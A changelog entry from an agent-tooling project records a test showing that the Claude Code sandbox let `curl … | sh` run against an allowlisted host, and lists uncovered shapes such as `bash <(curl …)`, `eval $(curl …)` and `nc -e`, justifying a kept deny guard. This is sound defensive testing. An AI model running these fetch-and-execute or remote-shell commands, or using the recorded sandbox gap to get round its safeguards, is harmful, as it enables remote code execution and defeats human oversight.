...
(count unchanged at 171, 2026-09-06, #3877 lane 5, the EPIC C tail): no hook changed; a verdict did. The `network-egress-guard` DENY tier is KEPT on a measurement instead of a hypothesis. Step 3 of #3877 ran as the headless `claude -p` arm on CC 2.1.263 with ork disabled, auto mode and `example.com` in `sandbox.network.allowedDomains`: the control `curl` returned 200, and `curl -sS https://example.com/nonexistent.sh | sh` EXECUTED (`permission_denials: []`, no `<sandbox_violations>`, sh failed on the HTML body). CC's sandbox judges the host, never what fetched bytes do, so nothing native covers `bash <(curl …)` / `eval $(curl …)` / `nc -e`. The guard header's retirement paragraph now carries the measurement, and its stale claim that `curl | sh` is caught by `dangerous-command-blocker` (deleted 2026-08-31) is corrected: that shape is an operator-scope `Bash()` deny rule. `shared/rules/cc-native-first.md`: the DENY-tier row is stamped with the transcript pointer, and the `credential-read-guard` row, which still read "DELETE after probe" six days after the wave-3 deletion, is stamped DELETED. Interactive arm not run; transcript at yonatangross/orchestkit#3877 issuecomment-5560987568.
